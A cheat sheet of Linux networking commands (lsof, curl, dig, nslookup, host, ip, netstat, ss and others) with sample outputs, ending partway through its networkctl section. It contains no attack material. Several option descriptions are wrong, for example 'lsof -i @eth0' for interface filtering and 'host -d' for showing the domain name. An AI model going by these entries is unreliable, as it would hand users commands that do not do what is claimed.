<details>
 <summary>lsof</summary>

### 1. List all open files

```
lsof
```

### 2. List open files for a specific user

```
lsof -u username
```

### 3. List open files for a specific process ID

```
lsof -p 1234
```

### 4. List processes using a specific file

```
lsof /path/to/file
```

### 5. List processes using a directory

```
lsof +D /path/to/directory
```

### 6. List all network connections

```
lsof -i
```

### 7. List processes using a specific port

```
lsof -i :8080
```

### 8. List TCP connections only

```
lsof -i tcp
```

### 9. List UDP connections only

```
lsof -i udp
```

### 10. List processes associated with an interface (e.g., eth0)

```
lsof -i @eth0
```

### 11. List IPv4 only

```
lsof -i 4
```

### 12. List IPv6 only

```
lsof -i 6
```

### 13. List deleted files still held open by processes

```
lsof | grep deleted
```

### 14. Kill a process using a port (example: port 3000)

```
kill -9 $(lsof -t -i :3000)
```

### 15. Display only process IDs using a port

```
lsof -t -i :3000
```

### 16. Show files opened by a specific command

```
lsof -c ssh
```

### 17. List open files with full command name matching

```
lsof -c ^ssh
```

### 18. Show network connections with their PIDs

```
lsof -i -P -n
```

### 19. Check which process is using a mount point

```
lsof /mnt/mydisk
```

### 20. List open files sorted by file descriptor number

```
lsof -Fn
```
</details>
<details>
<summary>curl</summary>

### 1. **Basic GET request**

Fetch the contents of a URL.

```
curl https://example.com
```

### 2. **GET request with headers**

Send custom headers in a GET request.

```
curl -H "Accept: application/json" https://api.example.com/data
```

### 3. **Save response to a file**

Save the output of the request to a file (instead of displaying it in the terminal).

```
curl -o output.txt https://example.com
```

### 4. **Download a file with the same name as on the server**

This will save the file using its original name.

```
curl -O https://example.com/file.zip
```

### 5. **Follow redirects**

Automatically follow redirects (useful for URLs that redirect, like shortened URLs).

```
curl -L https://example.com
```

### 6. **POST request with form data**

Send form data using a POST request.

```
curl -X POST -d "name=John&age=30" https://example.com/form
```

### 7. **POST request with JSON data**

Send JSON data with a POST request.

```
curl -X POST -H "Content-Type: application/json" -d '{"name":"John"}' https://api.example.com/users
```

### 8. **Multiple headers in a request**

Send multiple headers in a single request.

```
curl -H "Accept: application/json" -H "Authorization: Bearer your_token" https://api.example.com/data
```

### 9. **Upload a file with multipart/form-data**

Upload a file to the server using a `POST` request.

```
curl -F "file=@/path/to/file.txt" https://example.com/upload
```

### 10. **Use a custom HTTP method (e.g., PUT, DELETE)**

Change the request method (default is GET) to PUT, DELETE, etc.

```
curl -X PUT -d '{"title":"New Title"}' https://api.example.com/items/1
```

### 11. **Get only response headers**

Only fetch the headers from a URL (useful for checking if a resource exists, etc.).

```
curl -I https://example.com
```

### 12. **Verbose mode (debugging)**

Show detailed information about the request/response for debugging.

```
curl -v https://example.com
```

### 13. **Silent mode (no progress or error messages)**

Suppress the progress bar and error messages.

```
curl -s https://example.com
```

### 14. **Send cookie data**

Send cookies with the request.

```
curl --cookie "sessionid=12345" https://example.com
```

### 15. **Basic Authentication**

Use Basic Authentication with a username and password.

```
curl -u username:password https://example.com
```

### 16. **Limit request rate (throttling)**

Limit the speed of the curl request to a certain number of bytes per second.

```
curl --limit-rate 100k https://example.com
```

### 17. **Download a file with authentication (Bearer token)**

Send a GET request with a Bearer token for API authentication.

```
curl -H "Authorization: Bearer your_token" https://api.example.com/data
```

### 18. **Set a custom user agent**

Change the user agent string to simulate a different browser or client.

```
curl -A "Mozilla/5.0" https://example.com
```

### 19. **Send data in JSON format with custom headers**

Post JSON data with a custom header.

```
curl -X POST -H "Content-Type: application/json" -H "Accept: application/json" -d '{"username":"john"}' https://example.com/api
```

### 20. **Send a request with HTTP/2**

Force the use of HTTP/2 protocol (if the server supports it).

```
curl --http2 https://example.com
```
</details>
<details>
<summary>dig</summary>

### 1. **Basic DNS query for a domain**

Perform a basic query to resolve the A record (IPv4 address) for a domain.

```
dig example.com
```

### 2. **Query a specific type of record (e.g., A, MX, CNAME, etc.)**

You can specify the record type you want to query (e.g., A, MX, TXT).

```
dig example.com A
```

To query for MX (Mail Exchange) records:

```
dig example.com MX
```

### 3. **Query a specific DNS server**

If you want to query a specific DNS server, use the `@` symbol followed by the DNS server's IP address or hostname.

```
dig @8.8.8.8 example.com
```

This queries Google's public DNS server (8.8.8.8) for `example.com`.

### 4. **Query for TXT records (commonly used for SPF, DKIM, etc.)**

To fetch the TXT records for a domain:

```
dig example.com TXT
```

### 5. **Query for NS (Name Server) records**

Retrieve the name servers for a domain.

```
dig example.com NS
```

### 6. **Reverse DNS lookup (PTR record)**

For a reverse DNS lookup (i.e., finding the domain name associated with an IP address):

```
dig -x 8.8.8.8
```

### 7. **Show all available records**

Use the `ANY` query type to fetch all available DNS records for a domain (though this may not return everything depending on DNS server configuration):

```
dig example.com ANY
```

### 8. **Query with a specific port**

If you want to query a DNS server running on a port other than the default (53):

```
dig @8.8.8.8 -p 5353 example.com
```

### 9. **Get a detailed query output**

The `+trace` option helps trace the DNS resolution process, showing all the steps involved (starting from the root DNS servers).

```
dig +trace example.com
```

### 10. **Get a shorter output (only answer section)**

By default, `dig` returns detailed information. To show only the answer section (i.e., the resolved records), use the `+short` option.

```
dig +short example.com
```

### 11. **Query for the SOA (Start of Authority) record**

To retrieve the Start of Authority (SOA) record, which contains information about the domain’s DNS zone:

```
dig example.com SOA
```

### 12. **Query for CNAME (Canonical Name) record**

To get the CNAME record for a domain, use:

```
dig example.com CNAME
```

### 13. **Query for the authoritative name servers**

If you want to get authoritative nameservers for a domain, you can use:

```
dig example.com NS +auth
```

### 14. **Check the DNS query time**

To check how long the DNS query took, look at the `Query time` in the output or use the `+stats` flag.

```
dig example.com +stats
```

### 15. **Query a specific record from a specific server with verbose output**

You can increase verbosity by adding `+noquestion +noauthority +answer +stats`:

```
dig @8.8.8.8 example.com +noquestion +noauthority +answer +stats
```

### 16. **Limit the number of returned answers**

You can limit the number of answers returned using the `+nocomments` option.

```
dig example.com +nocomments
```

### 17. **Check for DNSSEC**

To check DNSSEC records for a domain:

```
dig +dnssec example.com
```

---

### Example outputs:

* **Standard Query**:

  ```
  ; <<>> DiG 9.10.6 <<>> example.com
  ;; global options: +cmd
  ;; Got answer:
  ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56183
  ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1
  ;; QUESTION SECTION:
  ;example.com.                   IN      A
  ;; ANSWER SECTION:
  example.com.            3600    IN      A       93.184.216.34
  ```

* **Short Output**:

  ```
  93.184.216.34
  ```
</details>
<details>
<summary>nslookup</summary>

### 1. **Basic DNS query for a domain**

This performs a simple query to resolve the A record (IPv4 address) for a domain.

```
nslookup example.com
```

### 2. **Query a specific DNS record type (e.g., A, MX, TXT, etc.)**

You can specify the record type you want to query using the `-type` option:

* For **MX (Mail Exchange) records**:

  ```
  nslookup -type=MX example.com
  ```
* For **TXT records** (commonly used for SPF, DKIM):

  ```
  nslookup -type=TXT example.com
  ```
* For **CNAME (Canonical Name) records**:

  ```
  nslookup -type=CNAME example.com
  ```

### 3. **Query a specific DNS server**

To query a specific DNS server, use the `server` command or `@` followed by the server's IP or hostname:

```
nslookup example.com 8.8.8.8
```

This queries Google's public DNS server (`8.8.8.8`) for `example.com`.

### 4. **Reverse DNS lookup (PTR record)**

Perform a reverse DNS lookup to find the domain name associated with an IP address.

```
nslookup 8.8.8.8
```

This will return the domain name associated with the IP address `8.8.8.8`.

### 5. **Query for NS (Name Server) records**

To find the name servers for a domain:

```
nslookup -type=NS example.com
```

### 6. **Query for SOA (Start of Authority) record**

To get the Start of Authority (SOA) record for a domain (contains authoritative information about the domain):

```
nslookup -type=SOA example.com
```

### 7. **Set the query type to ANY (fetch all available records)**

To fetch all available DNS records (if the server allows it):

```
nslookup -type=ANY example.com
```

### 8. **Interactive mode**

You can enter interactive mode by simply typing `nslookup` with no arguments, and then you can issue queries interactively.

```
nslookup
```

Once in interactive mode, you can change the query type, server, and more. For example:

```
> set type=MX
> example.com
```

To exit interactive mode:

```
> exit
```

### 9. **Change the default DNS server**

In interactive mode, you can change the DNS server by typing:

```
> server 8.8.8.8
```

This sets Google's DNS server as the query server.

### 10. **Query with a specific port (e.g., for a non-standard DNS port)**

If you need to query a DNS server running on a non-default port, use the `-port` option.

```
nslookup -port=5353 example.com
```

### 11. **Query with a different version of DNS (IPv4 or IPv6)**

To force `nslookup` to use **IPv4** or **IPv6** only, use the `-query=ip` flag.

* For **IPv4** (default):

  ```
  nslookup example.com
  ```
* For **IPv6**:

  ```
  nslookup -type=AAAA example.com
  ```

### 12. **Get DNS query details (debug mode)**

To get more detailed output, you can use the `-debug` flag.

```
nslookup -debug example.com
```

This provides detailed information about the DNS lookup process.

### 13. **Non-interactive mode for a specific query**

You can issue a one-time query with a specific server and record type in non-interactive mode:

```
nslookup -type=MX example.com 8.8.8.8
```

This queries Google's DNS server (`8.8.8.8`) for the **MX records** of `example.com`.

### 14. **Set the timeout for queries**

To change the timeout for DNS queries, use the `-timeout` option followed by the number of seconds.

```
nslookup -timeout=5 example.com
```

This will wait for 5 seconds before giving up on the query.

### 15. **Query for the IP address of a subdomain**

If you want to get the IP address of a subdomain (e.g., `www`):

```
nslookup www.example.com
```

---

### Example Outputs:

* **Basic query:**

  ```
  $ nslookup example.com
  Server:  UnKnown
  Address:  192.168.1.1

  Non-authoritative answer:
  Name:    example.com
  Address:  93.184.216.34
  ```

* **MX Record query:**

  ```
  $ nslookup -type=MX example.com
  Server:  UnKnown
  Address:  192.168.1.1

  Non-authoritative answer:
  example.com     MX preference = 10, mail exchanger = mail.example.com
  ```

* **Reverse DNS Lookup:**

  ```
  $ nslookup 8.8.8.8
  Server:  UnKnown
  Address:  192.168.1.1

  Name:    dns.google
  Address:  8.8.8.8
  ```
</details>
<details>
<summary>hostname</summary>

### 1. **Display the current hostname**

This simply displays the name of the current machine (hostname):

```
hostname
```

### 2. **Display the fully qualified domain name (FQDN)**

To get the fully qualified domain name (FQDN) of the system, use:

```
hostname -f
```

This shows the hostname along with the domain name (e.g., `host.example.com`).

### 3. **Display the system's IP address**

To display the system's IP address (by resolving the hostname):

```
hostname -I
```

This will return the IP address(es) assigned to the machine.

### 4. **Display the short hostname**

If you want just the short hostname (without domain information):

```
hostname -s
```

This will give you only the system’s name, e.g., `host` for `host.example.com`.

### 5. **Set the hostname temporarily**

To set the hostname for the current session (it will be lost after a reboot), use:

```
sudo hostname newhostname
```

For example:

```
sudo hostname mynewhostname
```

### 6. **Set the fully qualified domain name (FQDN) temporarily**

To set the FQDN temporarily, you can edit both the hostname and the domain name:

```
sudo hostname mynewhostname.example.com
```

### 7. **Set the hostname permanently (on most Linux distributions)**

Edit the `/etc/hostname` file directly and change the hostname. Then, you may need to restart the system or use the following command to apply it immediately:

```
sudo hostnamectl set-hostname newhostname
```

This will set the hostname permanently and ensure it survives across reboots.

### 8. **Set the hostname permanently using `hostnamectl`**

For systems using `systemd` (like modern Linux distributions), you can use `hostnamectl` to set the hostname permanently:

```
sudo hostnamectl set-hostname newhostname
```

You can also set a **static** or **transient** hostname using this tool:

* Static hostname (permanent):

  ```
  sudo hostnamectl set-hostname --static newhostname
  ```
* Transient hostname (temporary for the current session):

  ```
  sudo hostnamectl set-hostname --transient newhostname
  ```

### 9. **Set the hostname with a specific domain name**

You can set the **static hostname** and the **pretty hostname** (often used for human-readable names) using:

```
sudo hostnamectl set-hostname newhostname.example.com --static
```

### 10. **Show the hostname details using `hostnamectl`**

To view detailed information about the hostname, use:

```
hostnamectl
```

This will show:

* Static hostname
* Transient hostname
* Pretty hostname (optional)
* Machine ID
* Operating system and kernel details

### 11. **Display the system's DNS domain**

You can use the `dnsdomainname` command to show just the DNS domain name of the system:

```
dnsdomainname
```

This shows the domain name part of the fully qualified domain name (FQDN), e.g., `example.com` for `host.example.com`.

---

### Example Outputs:

* **Basic hostname display:**

  ```
  $ hostname
  myhostname
  ```

* **Fully Qualified Domain Name (FQDN):**

  ```
  $ hostname -f
  myhostname.example.com
  ```

* **IP address display:**

  ```
  $ hostname -I
  192.168.1.10
  ```

* **Short hostname:**

  ```
  $ hostname -s
  myhostname
  ```

* **Setting the hostname permanently using `hostnamectl`:**

  ```
  $ sudo hostnamectl set-hostname newhostname
  ```
</details>
<details>
<summary>host</summary>

The `host` command is a simple utility used to perform DNS lookups and resolve domain names to IP addresses, or vice versa. It is generally used to retrieve various types of DNS records for a given domain.

### 1. **Basic DNS lookup (resolve domain to IP address)**

To resolve a domain name to its corresponding IP address (A record):

```
host example.com
```

This will return the **IPv4 address** (A record) for the domain `example.com`.

### 2. **Query a specific record type (e.g., MX, A, CNAME, etc.)**

You can specify the type of record you want to query using the `-t` option. For example:

* **MX (Mail Exchange) records**:

  ```
  host -t MX example.com
  ```
* **A (IPv4 address) records**:

  ```
  host -t A example.com
  ```
* **CNAME (Canonical Name) records**:

  ```
  host -t CNAME example.com
  ```
* **TXT (Text) records**:

  ```
  host -t TXT example.com
  ```

### 3. **Reverse DNS lookup (PTR record)**

To perform a reverse DNS lookup (find the domain associated with an IP address), use the IP address as input:

```
host 8.8.8.8
```

This will return the **PTR record** for the IP address `8.8.8.8`, showing the domain name associated with that IP (e.g., `dns.google`).

### 4. **Query a specific DNS server**

You can specify which DNS server to query by using the `@` symbol followed by the DNS server's IP address or hostname:

```
host example.com 8.8.8.8
```

This queries Google's public DNS server (`8.8.8.8`) for the domain `example.com`.

### 5. **Get the IP address of a subdomain**

To resolve a subdomain (e.g., `www` or `mail`) to its IP address:

```
host www.example.com
```

### 6. **Display all available records (ANY)**

You can retrieve all available DNS records for a domain (if the DNS server allows this) by using `-t ANY`:

```
host -t ANY example.com
```

### 7. **Show authoritative name servers (NS) for a domain**

To query the **name servers** (NS records) for a domain:

```
host -t NS example.com
```

### 8. **Show the domain's SOA (Start of Authority) record**

To query the **Start of Authority (SOA)** record for a domain (this contains authoritative information about the domain):

```
host -t SOA example.com
```

### 9. **Show the domain’s DNS domain name**

To display just the domain name from the DNS (the DNS domain, not the hostname):

```
host -d example.com
```

### 10. **Find the domain for a specific IP (reverse lookup)**

You can perform a reverse DNS lookup on an IP address to find the associated domain name:

```
host 192.168.1.1
```

### 11. **Show the IP address of a domain (IPv6)**

To specifically query for the **IPv6 address (AAAA record)** of a domain:

```
host -t AAAA example.com
```

### 12. **Display verbose output**

To see detailed information about the lookup process, use the `-v` (verbose) flag:

```
host -v example.com
```

### 13. **Perform a lookup with a specific DNS server on a specific port**

You can specify both the DNS server and the port number to use for the query:

```
host example.com @8.8.8.8 -p 5353
```

This queries DNS server `8.8.8.8` on port `5353` for `example.com`.

### 14. **Use a specific query class**

To specify the query class (such as IN for Internet), you can use the `-C` flag:

```
host -C IN example.com
```

### 15. **Check DNS records for a given domain using a different port**

If you need to check DNS records on a non-default port (like for DNS over TLS/HTTPS or a custom DNS server):

```
host example.com 8.8.8.8 -p 853
```

This queries Google's DNS server on port `853` (commonly used for DNS over TLS).

---

### Example Outputs:

* **Basic query for A record:**

  ```
  $ host example.com
  example.com has address 93.184.216.34
  ```

* **MX Record query:**

  ```
  $ host -t MX example.com
  example.com mail is handled by 10 mail.example.com.
  ```

* **Reverse DNS lookup (PTR):**

  ```
  $ host 8.8.8.8
  8.8.8.8.in-addr.arpa domain name pointer dns.google.
  ```

* **All available records (ANY):**

  ```
  $ host -t ANY example.com
  example.com has address 93.184.216.34
  example.com mail is handled by 10 mail.example.com.
  example.com name server ns1.example.com.
  ```

* **SOA Record query:**

  ```
  $ host -t SOA example.com
  example.com has SOA record ns1.example.com. admin.example.com. 2021091101 86400 7200 3600000 86400
  ```
</details>
<details>
  <summary>ip</summary>
  
The `ip` command is a more modern and versatile utility for managing network interfaces, routes, and devices on Linux-based systems. It replaces older commands like `ifconfig`, `route`, and `netstat` in most cases. The `ip` command is part of the `iproute2` package and offers a wider range of functionalities for network configuration.


### 1. **Display all network interfaces**

To show all network interfaces, including their status, IP addresses, and other details:

```
ip addr
```

This is similar to `ifconfig`, but it provides more comprehensive information.

### 2. **Show details for a specific interface**

To display detailed information about a specific network interface (e.g., `eth0`, `wlan0`, or `ens33`):

```
ip addr show eth0
```

### 3. **Show all network interfaces (brief output)**

If you only want a brief summary of all interfaces without detailed information, use:

```
ip a
```

### 4. **Show IP address of an interface**

To display the IP address of a specific interface (e.g., `eth0`):

```
ip addr show dev eth0
```

Alternatively, you can use `ip a` for a shorter output.

### 5. **Assign an IP address to an interface**

To assign a static **IPv4 address** to a network interface:

```
sudo ip addr add 192.168.1.100/24 dev eth0
```

This assigns the IP `192.168.1.100` with the subnet mask `/24` (255.255.255.0) to the `eth0` interface.

### 6. **Remove an IP address from an interface**

To **remove** a previously assigned IP address from an interface:

```
sudo ip addr del 192.168.1.100/24 dev eth0
```

### 7. **Enable a network interface**

To bring a network interface (e.g., `eth0`) **up** (activate it):

```
sudo ip link set eth0 up
```

### 8. **Disable a network interface**

To bring a network interface **down** (deactivate it):

```
sudo ip link set eth0 down
```

### 9. **Display the routing table**

To show the **routing table**, which lists network routes and how packets are routed:

```
ip route show
```

Or simply:

```
ip r
```

### 10. **Add a new route**

To add a **static route** to the routing table:

```
sudo ip route add 192.168.2.0/24 via 192.168.1.1
```

This adds a route to the `192.168.2.0/24` network, using `192.168.1.1` as the gateway.

### 11. **Delete a route**

To delete an existing route:

```
sudo ip route del 192.168.2.0/24
```

### 12. **Display the default route**

To show the **default gateway** (route):

```
ip route show default
```

### 13. **Change the default route (gateway)**

To change the default route (set a new gateway):

```
sudo ip route change default via 192.168.1.1
```

### 14. **Show network interfaces with interface status**

To display interface names along with their status (up or down):

```
ip link show
```

### 15. **Set a MAC address for an interface**

To change the **MAC address** of an interface (e.g., `eth0`):

```
sudo ip link set dev eth0 address 00:11:22:33:44:55
```

### 16. **Show the IP address of a specific interface (IPv6)**

To show the **IPv6 address** of an interface:

```
ip addr show dev eth0 scope global
```

### 17. **Add an IPv6 address to an interface**

To add an **IPv6 address** to an interface:

```
sudo ip addr add 2001:db8::1/64 dev eth0
```

### 18. **Flush (clear) all IP addresses for an interface**

To **remove all IP addresses** associated with an interface (use with caution):

```
sudo ip addr flush dev eth0
```

### 19. **View IP address with additional details (detailed output)**

For a more **detailed view** of IP addresses and other networking information:

```
ip addr show dev eth0
```

### 20. **Show all IP addresses (both IPv4 and IPv6)**

To display both **IPv4 and IPv6 addresses** for all interfaces:

```
ip -6 addr
```

For IPv4:

```
ip -4 addr
```

### 21. **Set interface MTU (Maximum Transmission Unit)**

To configure the **MTU** size (the largest packet that can be transmitted over the interface):

```
sudo ip link set dev eth0 mtu 1500
```

### 22. **List all IP addresses and interface status in a concise format**

To display all network interfaces and their IP addresses in a more compact format:

```
ip -br addr
```

### 23. **Display the link state of a network interface**

To check if the link is up or down for a specific interface (e.g., `eth0`):

```
ip link show eth0
```

---

### Example Outputs:

* **Show interfaces with IPs:**

  ```
  $ ip addr show eth0
  3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 00:0c:29:fe:23:ff brd ff:ff:ff:ff:ff:ff
      inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe23:ffff/64 scope link
         valid_lft forever preferred_lft forever
  ```

* **Show routing table:**

  ```
  $ ip route show
  default via 192.168.1.1 dev eth0
  192.168.1.0/24 dev eth0 scope link src 192.168.1.100
  ```

* **Add a route:**

  ```
  $ sudo ip route add 192.168.2.0/24 via 192.168.1.1
  ```

* **Change the MAC address:**

  ```
  $ sudo ip link set eth0 address 00:11:22:33:44:55
  ```

* **Show all IPs in a concise format:**

  ```
  $ ip -br addr
  eth0     UP     192.168.1.100/24
  lo       UP     127.0.0.1/8
  ```
</details>
<details>
<summary>netstat</summary>

The `netstat` (network statistics) command is used for displaying network connections, routing tables, interface statistics, and other network-related information on a Linux or Unix-based system. Though `netstat` is now considered deprecated in favor of tools like `ss` (socket statistics) on many systems, it is still widely used and available for network diagnostics.

### 1. **Display all active network connections**

To show all active network connections (TCP, UDP, etc.) along with their status:

```
netstat
```

This will show a list of connections with details like protocol, local address, foreign address, and the current state of the connection.

### 2. **Show active TCP connections**

To display **only** active TCP connections:

```
netstat -t
```

This filters the output to show only TCP connections.

### 3. **Show active UDP connections**

To display **only** active UDP connections:

```
netstat -u
```

This will show all UDP connections.

### 4. **Display listening ports**

To show only the **listening** ports (i.e., those waiting for incoming connections):

```
netstat -l
```

To show listening ports for both TCP and UDP, use:

```
netstat -l -t -u
```

### 5. **Show all listening and non-listening sockets**

To display both **listening and non-listening** sockets (established connections):

```
netstat -a
```

This shows all active sockets, including listening and established connections.

### 6. **Display connections with PID and program names**

To display network connections along with their **process IDs (PID)** and associated program names (if available):

```
netstat -tulnp
```

* `-t` = TCP connections
* `-u` = UDP connections
* `-l` = Show only listening sockets
* `-n` = Show numerical addresses instead of resolving them to hostnames
* `-p` = Show PID and program name

Example output:

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1234/apache2
```

### 7. **Show routing table**

To display the **routing table** (similar to `ip route`):

```
netstat -r
```

This shows the routing table, including default routes and network destinations.

### 8. **Display network interface statistics**

To display statistics for each network interface (e.g., packet counts, errors, etc.):

```
netstat -i
```

You can also use `-e` for additional information about network interfaces:

```
netstat -i -e
```

### 9. **Show network statistics (protocol-specific)**

To show overall network statistics for various protocols (TCP, UDP, ICMP, etc.):

```
netstat -s
```

This provides detailed statistics, like the number of packets sent, errors, and more for each protocol.

### 10. **Display all open sockets (TCP and UDP)**

To show all open sockets (not just listening ones), including both TCP and UDP:

```
netstat -tul
```

### 11. **Show IP routing table**

To display the **IP routing table** (similar to `netstat -r` but with more details):

```
netstat -rn
```

The `-n` option prevents hostnames from being resolved, showing raw IP addresses instead.

### 12. **Show multicast group membership**

To show **multicast group memberships** for interfaces:

```
netstat -g
```

### 13. **Show all UNIX domain sockets**

To display **UNIX domain sockets** (used for inter-process communication):

```
netstat -x
```

You can also use `-a` with `-x` to show both local and remote UNIX sockets:

```
netstat -ax
```

### 14. **Display statistics for a specific protocol**

You can use the `-s` flag combined with a specific protocol to view its statistics. For example, to see **TCP statistics**:

```
netstat -st
```

### 15. **Show all connections, including numeric addresses**

If you want to see all network connections (TCP, UDP) with numerical addresses (without resolving hostnames):

```
netstat -n
```

### 16. **Show only established connections**

To list only **established connections**:

```
netstat -t | grep ESTABLISHED
```

This will show all established TCP connections.

### 17. **Display only listening TCP sockets**

To show **only listening TCP** sockets:

```
netstat -lt
```

### 18. **Show per-protocol statistics**

To view per-protocol network statistics:

```
netstat -s
```

This will display detailed statistics for various protocols like TCP, UDP, ICMP, and IP.

---

### Example Outputs:

1. **Display active connections:**

   ```
   $ netstat
   Active Internet connections (w/o servers)
   Proto Recv-Q Send-Q Local Address           Foreign Address         State
   tcp        0      0 192.168.1.100:22        192.168.1.101:1012      ESTABLISHED
   tcp        0      0 192.168.1.100:80        192.168.1.102:5678      TIME_WAIT
   ```

2. **Display listening ports (TCP + UDP):**

   ```
   $ netstat -l -t -u
   Active Internet connections (only servers)
   Proto Recv-Q Send-Q Local Address           Foreign Address         State
   tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
   udp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN
   ```

3. **Display network interface statistics:**

   ```
   $ netstat -i
   Kernel Interface table
   Iface MTU  RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg
   eth0  1500  12345    0      0      0    6789    0      0      0     BMRU
   lo    65536 67890    0      0      0    67890    0      0      0     LRU
   ```

4. **Show routing table:**

   ```
   $ netstat -r
   Kernel IP routing table
   Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
   0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
   192.168.1.0     *               255.255.255.0   U     0      0        0 eth0
   ```

---

### Important Notes:

* **Deprecated**: While `netstat` is still widely used, it has been largely replaced by **`ss`** (Socket Stat) on many modern Linux systems. `ss` provides similar functionality but is faster and more efficient.
* **Root privileges**: Some `netstat` options (e.g., showing process IDs and program names with `-p`) may require root privileges. You can prepend `sudo` to these commands if needed:

  ```
  sudo netstat -tulnp
  ```
</details>
<details>
<summary>ss</summary>

The `ss` command (Socket Stat) is a modern replacement for the older `netstat` command, offering more detailed and faster results when querying network connections and socket statistics. It’s part of the `iproute2` package, and while `netstat` is still used, `ss` is recommended for many use cases due to its speed and efficiency.

### 1. **Display all active sockets**

To show all active network sockets (TCP, UDP, etc.):

```
ss
```

This will display both listening and established connections.

### 2. **Show all TCP sockets**

To display only **TCP** connections:

```
ss -t
```

This will show all active TCP sockets.

### 3. **Show all UDP sockets**

To display only **UDP** connections:

```
ss -u
```

### 4. **Display listening sockets**

To show all **listening** sockets (those waiting for incoming connections), both TCP and UDP:

```
ss -l
```

For only TCP listening sockets:

```
ss -lt
```

For only UDP listening sockets:

```
ss -lu
```

### 5. **Show all TCP connections with state**

To show **all TCP connections** along with their state (e.g., `ESTABLISHED`, `LISTEN`, etc.):

```
ss -t -a
```

This will show all TCP sockets, including listening and established connections.

### 6. **Show only established TCP connections**

To display only **established** TCP connections:

```
ss -t state established
```

This will show connections that are currently established.

### 7. **Show all connections with process information**

To display **process** information along with the connections (e.g., PID and program name), use:

```
ss -tulnp
```

* `-t` = Show TCP connections
* `-u` = Show UDP connections
* `-l` = Show listening sockets
* `-n` = Show numerical addresses (without DNS resolution)
* `-p` = Show process and PID

Example output:

```
State      Recv-Q Send-Q   Local Address:Port   Peer Address:Port  Process
LISTEN     0      128      0.0.0.0:80           0.0.0.0:*           users:(("nginx",pid=2345,fd=6))
ESTAB      0      0        192.168.1.100:22     192.168.1.101:54321 users:(("sshd",pid=987,fd=3))
```

### 8. **Show all connections to a specific port**

To show all connections to a specific **port**, say port `80` (HTTP), use:

```
ss -tuln sport = :80
```

This will show all TCP or UDP sockets listening on port `80`.

### 9. **Show all connections from a specific address**

To show all connections **from a specific IP address**, use:

```
ss -tuln src 192.168.1.100
```

This filters the output to show all connections originating from `192.168.1.100`.

### 10. **Show all connections to a specific IP address**

To show all connections **to a specific IP address**, use:

```
ss -tuln dst 192.168.1.100
```

### 11. **Show detailed socket statistics**

To display detailed statistics for all sockets, including the number of bytes sent/received, state changes, etc., use:

```
ss -s
```

This will give you a summary of socket statistics for different protocols (TCP, UDP, etc.).

### 12. **Show all UNIX domain sockets**

To display **UNIX domain sockets** (used for inter-process communication), use:

```
ss -x
```

### 13. **Show specific socket information by state**

To show sockets in a **specific state**, such as `LISTEN`, `ESTABLISHED`, or `TIME-WAIT`, you can use:

* **Show listening sockets**:

  ```
  ss -t state listening
  ```
* **Show established connections**:

  ```
  ss -t state established
  ```

### 14. **Show information for a specific process (PID)**

To filter connections for a specific **PID** (e.g., PID `1234`):

```
ss -p | grep 1234
```

This will list all connections associated with the process ID `1234`.

### 15. **Show connections using a specific protocol**

To show all connections for a **specific protocol** (e.g., **TCP** or **UDP**):

```
ss -t
```

For **UDP**:

```
ss -u
```

### 16. **Show all socket states with numerical output**

To show all socket states numerically (without DNS resolution):

```
ss -n
```

---

### Example Outputs:

1. **Display all TCP connections with their state:**

   ```
   $ ss -t
   State      Recv-Q Send-Q   Local Address:Port   Peer Address:Port
   ESTAB      0      0        192.168.1.100:22     192.168.1.101:54321
   LISTEN     0      128      0.0.0.0:80           0.0.0.0:*
   ```

2. **Display listening TCP and UDP sockets:**

   ```
   $ ss -l
   Netid  State      Recv-Q Send-Q Local Address:Port  Peer Address:Port
   tcp    LISTEN     0      128    0.0.0.0:80         0.0.0.0:*
   udp    UNCONN     0      0      0.0.0.0:1234       0.0.0.0:*
   ```

3. **Show connections for a specific port:**

   ```
   $ ss -tuln sport = :80
   Netid  State      Recv-Q Send-Q Local Address:Port  Peer Address:Port
   tcp    LISTEN     0      128    0.0.0.0:80         0.0.0.0:*
   ```

4. **Display all connections with process information:**

   ```
   $ ss -tulnp
   Netid  State      Recv-Q Send-Q Local Address:Port   Peer Address:Port  Process
   tcp    LISTEN     0      128    0.0.0.0:80           0.0.0.0:*           users:(("nginx",pid=1234,fd=6))
   ```

5. **Display all UDP connections:**

   ```
   $ ss -u
   Netid  State      Recv-Q Send-Q Local Address:Port   Peer Address:Port
   udp    UNCONN     0      0      0.0.0.0:1234        0.0.0.0:*
   ```

6. **Show the socket statistics:**

   ```
   $ ss -s
   Total: 1 (kernel 1)
   TCP: 1 (estab 1, closed 0, orphaned 0, synrecv 0, timewait 0)
   UDP: 1 (active 1)
   ```
 </details>
<details>
<summary>networkctl</summary>

The `networkctl` command is part of `systemd` and provides a way to manage and interact with network interfaces and configurations on systems that use `systemd-networkd` for network management. It's especially useful for systems with `systemd` as the init system, as it gives you insights into the status of network interfaces, the network configuration, and more.

### 1. **Display the status of all network interfaces**

To show the status of all network interfaces managed by `systemd-networkd`:

```
networkctl
```

This will list each network interface's name, type, state (e.g., `configured`, `routable`, `deconfigured`), and other details such as IP addresses, etc.

### 2. **Show detailed status for a specific interface**

To display **detailed status** for a specific interface (e.g., `eth0` or `wlan0`):

```
networkctl status eth0
```

This provides information like the interface state, IP addresses, routes, etc.

Example output:

```
● eth0
       Link File: /etc/systemd/network/10-eth0.network
    Network File: /etc/systemd/network/10-eth0.network
            Type: ether
           State: routable
          Address: 192.168.1.100
       MTU Size: 1500
```

### 3. **Show all active network connections**

To show all **active network connections** (interfaces that are up and working):

```
networkctl list
```

This lists interfaces that are actively participating in the network.

### 4. **Show the status of a specific interface (brief)**

To show a **brief status** of a specific interface (e.g., `eth0`):

```
networkctl status eth0 --brief
```

This will show only the most essential information for the interface (e.g., interface state, IP addresses, etc.).

### 5. **Display all systemd network units**

